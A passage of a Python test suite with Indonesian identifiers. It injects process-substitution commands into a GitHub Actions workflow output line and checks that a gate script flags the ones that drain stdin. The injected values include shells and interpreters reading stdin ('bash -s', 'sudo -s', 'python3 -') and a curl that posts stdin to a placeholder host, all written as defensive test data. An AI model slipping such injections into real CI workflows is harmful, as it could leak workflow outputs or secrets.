        baris_aksi119 = [b for b in isi_aksi119.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru119 = isi_aksi119.replace(
                baris_aksi119,
                baris_aksi119.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(jq -r .tag; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru119 != isi_aksi119, \
            "suntikan aksi119 tidak menembak"
        with open(berkas_aksi119, "w", encoding="utf-8") as f:
            f.write(isi_baru119)
        rc, out = jalan(subskrip,
                        [sys.executable, GERBANG, "--semua"])
        periksa("perintah beroperand filter: jq tanpa berkas adalah penguras — gerbang gagal (Audit 1038)", rc != 0)
        shutil.rmtree(subskrip, ignore_errors=True)

        subinterp = klon(tmp, "subinterp")
        berkas_aksi120 = os.path.join(
            subinterp, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi120, encoding="utf-8") as f:
            isi_aksi120 = f.read()
        baris_aksi120 = [b for b in isi_aksi120.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru120 = isi_aksi120.replace(
                baris_aksi120,
                baris_aksi120.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(python3 -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru120 != isi_aksi120, \
            "suntikan aksi120 tidak menembak"
        with open(berkas_aksi120, "w", encoding="utf-8") as f:
            f.write(isi_baru120)
        rc, out = jalan(subinterp,
                        [sys.executable, GERBANG, "--semua"])
        periksa("interpreter membaca skrip dari stdin: python3 - adalah penguras — gerbang gagal (Audit 1039)", rc != 0)
        shutil.rmtree(subinterp, ignore_errors=True)

        submapfile = klon(tmp, "submapfile")
        berkas_aksi121 = os.path.join(
            submapfile, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi121, encoding="utf-8") as f:
            isi_aksi121 = f.read()
        baris_aksi121 = [b for b in isi_aksi121.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru121 = isi_aksi121.replace(
                baris_aksi121,
                baris_aksi121.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(mapfile; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru121 != isi_aksi121, \
            "suntikan aksi121 tidak menembak"
        with open(berkas_aksi121, "w", encoding="utf-8") as f:
            f.write(isi_baru121)
        rc, out = jalan(submapfile,
                        [sys.executable, GERBANG, "--semua"])
        periksa("builtin penampung tanpa batas menguras — gerbang gagal (Audit 1040)", rc != 0)
        shutil.rmtree(submapfile, ignore_errors=True)

        subddstdin = klon(tmp, "subddstdin")
        berkas_aksi122 = os.path.join(
            subddstdin, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi122, encoding="utf-8") as f:
            isi_aksi122 = f.read()
        baris_aksi122 = [b for b in isi_aksi122.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru122 = isi_aksi122.replace(
                baris_aksi122,
                baris_aksi122.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(dd if=/dev/stdin; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru122 != isi_aksi122, \
            "suntikan aksi122 tidak menembak"
        with open(berkas_aksi122, "w", encoding="utf-8") as f:
            f.write(isi_baru122)
        rc, out = jalan(subddstdin,
                        [sys.executable, GERBANG, "--semua"])
        periksa("dd if=/dev/stdin membaca stdin itu sendiri — gerbang gagal (Audit 1041)", rc != 0)
        shutil.rmtree(subddstdin, ignore_errors=True)

        subbacktick = klon(tmp, "subbacktick")
        berkas_aksi123 = os.path.join(
            subbacktick, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi123, encoding="utf-8") as f:
            isi_aksi123 = f.read()
        baris_aksi123 = [b for b in isi_aksi123.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru123 = isi_aksi123.replace(
                baris_aksi123,
                baris_aksi123.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(cat `cat`; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru123 != isi_aksi123, \
            "suntikan aksi123 tidak menembak"
        with open(berkas_aksi123, "w", encoding="utf-8") as f:
            f.write(isi_baru123)
        rc, out = jalan(subbacktick,
                        [sys.executable, GERBANG, "--semua"])
        periksa("substitusi backtick dinilai isinya: penguras — gerbang gagal (Audit 1045)", rc != 0)
        shutil.rmtree(subbacktick, ignore_errors=True)

        subkutipgabung = klon(tmp, "subkutipgabung")
        berkas_aksi124 = os.path.join(
            subkutipgabung, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi124, encoding="utf-8") as f:
            isi_aksi124 = f.read()
        baris_aksi124 = [b for b in isi_aksi124.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru124 = isi_aksi124.replace(
                baris_aksi124,
                baris_aksi124.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(c''at; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru124 != isi_aksi124, \
            "suntikan aksi124 tidak menembak"
        with open(berkas_aksi124, "w", encoding="utf-8") as f:
            f.write(isi_baru124)
        rc, out = jalan(subkutipgabung,
                        [sys.executable, GERBANG, "--semua"])
        periksa("penggabungan kutip bersebelahan membentuk nama perintah — gerbang gagal (Audit 1046)", rc != 0)
        shutil.rmtree(subkutipgabung, ignore_errors=True)

        subsettr = klon(tmp, "subsettr")
        berkas_aksi125 = os.path.join(
            subsettr, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi125, encoding="utf-8") as f:
            isi_aksi125 = f.read()
        baris_aksi125 = [b for b in isi_aksi125.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru125 = isi_aksi125.replace(
                baris_aksi125,
                baris_aksi125.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tr 'a-z' 'A-Z'; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru125 != isi_aksi125, \
            "suntikan aksi125 tidak menembak"
        with open(berkas_aksi125, "w", encoding="utf-8") as f:
            f.write(isi_baru125)
        rc, out = jalan(subsettr,
                        [sys.executable, GERBANG, "--semua"])
        periksa("set tr berkutip adalah operand himpunan: tetap menguras — gerbang gagal (Audit 1047)", rc != 0)
        shutil.rmtree(subsettr, ignore_errors=True)

        subspasikutip = klon(tmp, "subspasikutip")
        berkas_aksi126 = os.path.join(
            subspasikutip, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi126, encoding="utf-8") as f:
            isi_aksi126 = f.read()
        baris_aksi126 = [b for b in isi_aksi126.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru126 = isi_aksi126.replace(
                baris_aksi126,
                baris_aksi126.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(grep 'UT UH'; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru126 != isi_aksi126, \
            "suntikan aksi126 tidak menembak"
        with open(berkas_aksi126, "w", encoding="utf-8") as f:
            f.write(isi_baru126)
        rc, out = jalan(subspasikutip,
                        [sys.executable, GERBANG, "--semua"])
        periksa("operand berkutip berisi spasi satu token: pola grep menguras — gerbang gagal (Audit 1047)", rc != 0)
        shutil.rmtree(subspasikutip, ignore_errors=True)

        subtac = klon(tmp, "subtac")
        berkas_aksi132 = os.path.join(
            subtac, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi132, encoding="utf-8") as f:
            isi_aksi132 = f.read()
        baris_aksi132 = [b for b in isi_aksi132.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru132 = isi_aksi132.replace(
                baris_aksi132,
                baris_aksi132.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tac -s .; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru132 != isi_aksi132, \
            "suntikan aksi132 tidak menembak"
        with open(berkas_aksi132, "w", encoding="utf-8") as f:
            f.write(isi_baru132)
        rc, out = jalan(subtac,
                        [sys.executable, GERBANG, "--semua"])
        periksa("nilai -s tac adalah opsi: tac tetap penguras — gerbang gagal (Audit 1048)", rc != 0)
        shutil.rmtree(subtac, ignore_errors=True)

        subpyi = klon(tmp, "subpyi")
        berkas_aksi131 = os.path.join(
            subpyi, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi131, encoding="utf-8") as f:
            isi_aksi131 = f.read()
        baris_aksi131 = [b for b in isi_aksi131.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru131 = isi_aksi131.replace(
                baris_aksi131,
                baris_aksi131.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(python3 -i skrip.py; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru131 != isi_aksi131, \
            "suntikan aksi131 tidak menembak"
        with open(berkas_aksi131, "w", encoding="utf-8") as f:
            f.write(isi_baru131)
        rc, out = jalan(subpyi,
                        [sys.executable, GERBANG, "--semua"])
        periksa("python3 -i jatuh ke REPL sesudah skrip: penguras — gerbang gagal (Audit 1049)", rc != 0)
        shutil.rmtree(subpyi, ignore_errors=True)

        subsudoshell = klon(tmp, "subsudoshell")
        berkas_aksi130 = os.path.join(
            subsudoshell, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi130, encoding="utf-8") as f:
            isi_aksi130 = f.read()
        baris_aksi130 = [b for b in isi_aksi130.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru130 = isi_aksi130.replace(
                baris_aksi130,
                baris_aksi130.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sudo -s; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru130 != isi_aksi130, \
            "suntikan aksi130 tidak menembak"
        with open(berkas_aksi130, "w", encoding="utf-8") as f:
            f.write(isi_baru130)
        rc, out = jalan(subsudoshell,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sudo -s menjalankan shell pembaca perintah: penguras — gerbang gagal (Audit 1050)", rc != 0)
        shutil.rmtree(subsudoshell, ignore_errors=True)

        subexeckata = klon(tmp, "subexeckata")
        berkas_aksi127 = os.path.join(
            subexeckata, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi127, encoding="utf-8") as f:
            isi_aksi127 = f.read()
        baris_aksi127 = [b for b in isi_aksi127.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru127 = isi_aksi127.replace(
                baris_aksi127,
                baris_aksi127.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(exec time cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru127 != isi_aksi127, \
            "suntikan aksi127 tidak menembak"
        with open(berkas_aksi127, "w", encoding="utf-8") as f:
            f.write(isi_baru127)
        rc, out = jalan(subexeckata,
                        [sys.executable, GERBANG, "--semua"])
        periksa("kata kunci sesudah exec adalah nama program: bukan penguras — gerbang lolos (Audit 1051)", rc == 0)
        shutil.rmtree(subexeckata, ignore_errors=True)

        subawkset = klon(tmp, "subawkset")
        berkas_aksi128 = os.path.join(
            subawkset, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi128, encoding="utf-8") as f:
            isi_aksi128 = f.read()
        baris_aksi128 = [b for b in isi_aksi128.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru128 = isi_aksi128.replace(
                baris_aksi128,
                baris_aksi128.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(awk FS=: '{print}'; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru128 != isi_aksi128, \
            "suntikan aksi128 tidak menembak"
        with open(berkas_aksi128, "w", encoding="utf-8") as f:
            f.write(isi_baru128)
        rc, out = jalan(subawkset,
                        [sys.executable, GERBANG, "--semua"])
        periksa("penetapan awk sebelum program membatalkan perintah: bukan penguras — gerbang lolos (Audit 1052)", rc == 0)
        shutil.rmtree(subawkset, ignore_errors=True)

        submapredir = klon(tmp, "submapredir")
        berkas_aksi129 = os.path.join(
            submapredir, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi129, encoding="utf-8") as f:
            isi_aksi129 = f.read()
        baris_aksi129 = [b for b in isi_aksi129.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru129 = isi_aksi129.replace(
                baris_aksi129,
                baris_aksi129.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(mapfile < berkasIn; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru129 != isi_aksi129, \
            "suntikan aksi129 tidak menembak"
        with open(berkas_aksi129, "w", encoding="utf-8") as f:
            f.write(isi_baru129)
        rc, out = jalan(submapredir,
                        [sys.executable, GERBANG, "--semua"])
        periksa("redirect sesudah mapfile mengganti stdin: bukan penguras — gerbang lolos (Audit 1053)", rc == 0)
        shutil.rmtree(submapredir, ignore_errors=True)

        with open(GERBANG, encoding="utf-8") as f:
            isi_gerbang_1054 = f.read()
        periksa("komentar Audit 987 tunggal "
                "(Audit 1054)",
                isi_gerbang_1054.count(
                    "# Audit 987: isi string env -S") == 1)

        subchecksum = klon(tmp, "subchecksum")
        berkas_aksi133 = os.path.join(
            subchecksum, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi133, encoding="utf-8") as f:
            isi_aksi133 = f.read()
        baris_aksi133 = [b for b in isi_aksi133.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru133 = isi_aksi133.replace(
                baris_aksi133,
                baris_aksi133.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sha1sum; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru133 != isi_aksi133, \
            "suntikan aksi133 tidak menembak"
        with open(berkas_aksi133, "w", encoding="utf-8") as f:
            f.write(isi_baru133)
        rc, out = jalan(subchecksum,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sisa keluarga checksum adalah penguras — gerbang gagal (Audit 1055)", rc != 0)
        shutil.rmtree(subchecksum, ignore_errors=True)

        subfilter3 = klon(tmp, "subfilter3")
        berkas_aksi134 = os.path.join(
            subfilter3, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi134, encoding="utf-8") as f:
            isi_aksi134 = f.read()
        baris_aksi134 = [b for b in isi_aksi134.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru134 = isi_aksi134.replace(
                baris_aksi134,
                baris_aksi134.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(fmt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru134 != isi_aksi134, \
            "suntikan aksi134 tidak menembak"
        with open(berkas_aksi134, "w", encoding="utf-8") as f:
            f.write(isi_baru134)
        rc, out = jalan(subfilter3,
                        [sys.executable, GERBANG, "--semua"])
        periksa("filter teks tingkat-3 adalah penguras — gerbang gagal (Audit 1056)", rc != 0)
        shutil.rmtree(subfilter3, ignore_errors=True)

        subkompres = klon(tmp, "subkompres")
        berkas_aksi135 = os.path.join(
            subkompres, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi135, encoding="utf-8") as f:
            isi_aksi135 = f.read()
        baris_aksi135 = [b for b in isi_aksi135.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru135 = isi_aksi135.replace(
                baris_aksi135,
                baris_aksi135.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(xz; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru135 != isi_aksi135, \
            "suntikan aksi135 tidak menembak"
        with open(berkas_aksi135, "w", encoding="utf-8") as f:
            f.write(isi_baru135)
        rc, out = jalan(subkompres,
                        [sys.executable, GERBANG, "--semua"])
        periksa("kompresor saudara gzip adalah penguras — gerbang gagal (Audit 1057)", rc != 0)
        shutil.rmtree(subkompres, ignore_errors=True)

        subshell = klon(tmp, "subshell")
        berkas_aksi136 = os.path.join(
            subshell, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi136, encoding="utf-8") as f:
            isi_aksi136 = f.read()
        baris_aksi136 = [b for b in isi_aksi136.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru136 = isi_aksi136.replace(
                baris_aksi136,
                baris_aksi136.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(bash -s; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru136 != isi_aksi136, \
            "suntikan aksi136 tidak menembak"
        with open(berkas_aksi136, "w", encoding="utf-8") as f:
            f.write(isi_baru136)
        rc, out = jalan(subshell,
                        [sys.executable, GERBANG, "--semua"])
        periksa("shell membaca perintah dari stdin: penguras — gerbang gagal (Audit 1058)", rc != 0)
        shutil.rmtree(subshell, ignore_errors=True)

        subsqlite = klon(tmp, "subsqlite")
        berkas_aksi137 = os.path.join(
            subsqlite, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi137, encoding="utf-8") as f:
            isi_aksi137 = f.read()
        baris_aksi137 = [b for b in isi_aksi137.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru137 = isi_aksi137.replace(
                baris_aksi137,
                baris_aksi137.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sqlite3; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru137 != isi_aksi137, \
            "suntikan aksi137 tidak menembak"
        with open(berkas_aksi137, "w", encoding="utf-8") as f:
            f.write(isi_baru137)
        rc, out = jalan(subsqlite,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sqlite3 membaca SQL dari stdin: penguras — gerbang gagal (Audit 1059)", rc != 0)
        shutil.rmtree(subsqlite, ignore_errors=True)

        subopenssl = klon(tmp, "subopenssl")
        berkas_aksi138 = os.path.join(
            subopenssl, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi138, encoding="utf-8") as f:
            isi_aksi138 = f.read()
        baris_aksi138 = [b for b in isi_aksi138.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru138 = isi_aksi138.replace(
                baris_aksi138,
                baris_aksi138.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst -sha256; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru138 != isi_aksi138, \
            "suntikan aksi138 tidak menembak"
        with open(berkas_aksi138, "w", encoding="utf-8") as f:
            f.write(isi_baru138)
        rc, out = jalan(subopenssl,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl dgst tanpa berkas adalah penguras — gerbang gagal (Audit 1060)", rc != 0)
        shutil.rmtree(subopenssl, ignore_errors=True)

        subtar = klon(tmp, "subtar")
        berkas_aksi139 = os.path.join(
            subtar, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi139, encoding="utf-8") as f:
            isi_aksi139 = f.read()
        baris_aksi139 = [b for b in isi_aksi139.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru139 = isi_aksi139.replace(
                baris_aksi139,
                baris_aksi139.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -tf -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru139 != isi_aksi139, \
            "suntikan aksi139 tidak menembak"
        with open(berkas_aksi139, "w", encoding="utf-8") as f:
            f.write(isi_baru139)
        rc, out = jalan(subtar,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar membaca arsip dari stdin: penguras — gerbang gagal (Audit 1061)", rc != 0)
        shutil.rmtree(subtar, ignore_errors=True)

        subgitstdin = klon(tmp, "subgitstdin")
        berkas_aksi140 = os.path.join(
            subgitstdin, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi140, encoding="utf-8") as f:
            isi_aksi140 = f.read()
        baris_aksi140 = [b for b in isi_aksi140.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru140 = isi_aksi140.replace(
                baris_aksi140,
                baris_aksi140.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git hash-object --stdin; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru140 != isi_aksi140, \
            "suntikan aksi140 tidak menembak"
        with open(berkas_aksi140, "w", encoding="utf-8") as f:
            f.write(isi_baru140)
        rc, out = jalan(subgitstdin,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git hash-object --stdin adalah penguras — gerbang gagal (Audit 1062)", rc != 0)
        shutil.rmtree(subgitstdin, ignore_errors=True)

        subdiff = klon(tmp, "subdiff")
        berkas_aksi141 = os.path.join(
            subdiff, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi141, encoding="utf-8") as f:
            isi_aksi141 = f.read()
        baris_aksi141 = [b for b in isi_aksi141.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru141 = isi_aksi141.replace(
                baris_aksi141,
                baris_aksi141.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(diff - berkasIn; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru141 != isi_aksi141, \
            "suntikan aksi141 tidak menembak"
        with open(berkas_aksi141, "w", encoding="utf-8") as f:
            f.write(isi_baru141)
        rc, out = jalan(subdiff,
                        [sys.executable, GERBANG, "--semua"])
        periksa("operand '-' diff adalah stdin: penguras — gerbang gagal (Audit 1063)", rc != 0)
        shutil.rmtree(subdiff, ignore_errors=True)

        subziplist = klon(tmp, "subziplist")
        berkas_aksi142 = os.path.join(
            subziplist, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi142, encoding="utf-8") as f:
            isi_aksi142 = f.read()
        baris_aksi142 = [b for b in isi_aksi142.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru142 = isi_aksi142.replace(
                baris_aksi142,
                baris_aksi142.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(zip a.zip -@; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru142 != isi_aksi142, \
            "suntikan aksi142 tidak menembak"
        with open(berkas_aksi142, "w", encoding="utf-8") as f:
            f.write(isi_baru142)
        rc, out = jalan(subziplist,
                        [sys.executable, GERBANG, "--semua"])
        periksa("zip -@ membaca daftar nama dari stdin: penguras — gerbang gagal (Audit 1064)", rc != 0)
        shutil.rmtree(subziplist, ignore_errors=True)

        subunshare = klon(tmp, "subunshare")
        berkas_aksi143 = os.path.join(
            subunshare, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi143, encoding="utf-8") as f:
            isi_aksi143 = f.read()
        baris_aksi143 = [b for b in isi_aksi143.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru143 = isi_aksi143.replace(
                baris_aksi143,
                baris_aksi143.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(unshare -Ur cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru143 != isi_aksi143, \
            "suntikan aksi143 tidak menembak"
        with open(berkas_aksi143, "w", encoding="utf-8") as f:
            f.write(isi_baru143)
        rc, out = jalan(subunshare,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pembungkus unshare transparan: pembaca di baliknya penguras — gerbang gagal (Audit 1065)", rc != 0)
        shutil.rmtree(subunshare, ignore_errors=True)

        subsocat = klon(tmp, "subsocat")
        berkas_aksi144 = os.path.join(
            subsocat, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi144, encoding="utf-8") as f:
            isi_aksi144 = f.read()
        baris_aksi144 = [b for b in isi_aksi144.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru144 = isi_aksi144.replace(
                baris_aksi144,
                baris_aksi144.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(socat - /dev/null; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru144 != isi_aksi144, \
            "suntikan aksi144 tidak menembak"
        with open(berkas_aksi144, "w", encoding="utf-8") as f:
            f.write(isi_baru144)
        rc, out = jalan(subsocat,
                        [sys.executable, GERBANG, "--semua"])
        periksa("alamat STDIO socat membaca stdin: penguras — gerbang gagal (Audit 1066)", rc != 0)
        shutil.rmtree(subsocat, ignore_errors=True)

        submawk = klon(tmp, "submawk")
        berkas_aksi145 = os.path.join(
            submawk, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi145, encoding="utf-8") as f:
            isi_aksi145 = f.read()
        baris_aksi145 = [b for b in isi_aksi145.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru145 = isi_aksi145.replace(
                baris_aksi145,
                baris_aksi145.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(mawk '{print}'; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru145 != isi_aksi145, \
            "suntikan aksi145 tidak menembak"
        with open(berkas_aksi145, "w", encoding="utf-8") as f:
            f.write(isi_baru145)
        rc, out = jalan(submawk,
                        [sys.executable, GERBANG, "--semua"])
        periksa("varian nama awk dinilai keluarga skrip: penguras — gerbang gagal (Audit 1067)", rc != 0)
        shutil.rmtree(submawk, ignore_errors=True)

        subcurl = klon(tmp, "subcurl")
        berkas_aksi146 = os.path.join(
            subcurl, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi146, encoding="utf-8") as f:
            isi_aksi146 = f.read()
        baris_aksi146 = [b for b in isi_aksi146.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru146 = isi_aksi146.replace(
                baris_aksi146,
                baris_aksi146.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(curl -d @- https://contoh.invalid/; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru146 != isi_aksi146, \
            "suntikan aksi146 tidak menembak"
        with open(berkas_aksi146, "w", encoding="utf-8") as f:
            f.write(isi_baru146)
        rc, out = jalan(subcurl,
                        [sys.executable, GERBANG, "--semua"])
        periksa("curl -d @- membaca data dari stdin: penguras — gerbang gagal (Audit 1068)", rc != 0)
        shutil.rmtree(subcurl, ignore_errors=True)

        subgpg = klon(tmp, "subgpg")
        berkas_aksi147 = os.path.join(
            subgpg, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi147, encoding="utf-8") as f:
            isi_aksi147 = f.read()
        baris_aksi147 = [b for b in isi_aksi147.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru147 = isi_aksi147.replace(
                baris_aksi147,
                baris_aksi147.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(gpg --batch --pinentry-mode loopback --passphrase x -c; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru147 != isi_aksi147, \
            "suntikan aksi147 tidak menembak"
        with open(berkas_aksi147, "w", encoding="utf-8") as f:
            f.write(isi_baru147)
        rc, out = jalan(subgpg,
                        [sys.executable, GERBANG, "--semua"])
        periksa("gpg batch simetris membaca plaintext dari stdin: penguras — gerbang gagal (Audit 1069)", rc != 0)
        shutil.rmtree(subgpg, ignore_errors=True)

        subsyscat = klon(tmp, "subsyscat")
        berkas_aksi148 = os.path.join(
            subsyscat, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi148, encoding="utf-8") as f:
            isi_aksi148 = f.read()
        baris_aksi148 = [b for b in isi_aksi148.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru148 = isi_aksi148.replace(
                baris_aksi148,
                baris_aksi148.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(systemd-cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru148 != isi_aksi148, \
            "suntikan aksi148 tidak menembak"
        with open(berkas_aksi148, "w", encoding="utf-8") as f:
            f.write(isi_baru148)
        rc, out = jalan(subsyscat,
                        [sys.executable, GERBANG, "--semua"])
        periksa("systemd-cat tanpa perintah meneruskan stdin: penguras — gerbang gagal (Audit 1070)", rc != 0)
        shutil.rmtree(subsyscat, ignore_errors=True)

        submake = klon(tmp, "submake")
        berkas_aksi149 = os.path.join(
            submake, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi149, encoding="utf-8") as f:
            isi_aksi149 = f.read()
        baris_aksi149 = [b for b in isi_aksi149.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru149 = isi_aksi149.replace(
                baris_aksi149,
                baris_aksi149.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(make -f -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru149 != isi_aksi149, \
            "suntikan aksi149 tidak menembak"
        with open(berkas_aksi149, "w", encoding="utf-8") as f:
            f.write(isi_baru149)
        rc, out = jalan(submake,
                        [sys.executable, GERBANG, "--semua"])
        periksa("make -f - membaca makefile dari stdin: penguras — gerbang gagal (Audit 1071)", rc != 0)
        shutil.rmtree(submake, ignore_errors=True)

        submore = klon(tmp, "submore")
        berkas_aksi150 = os.path.join(
            submore, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi150, encoding="utf-8") as f:
            isi_aksi150 = f.read()
        baris_aksi150 = [b for b in isi_aksi150.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru150 = isi_aksi150.replace(
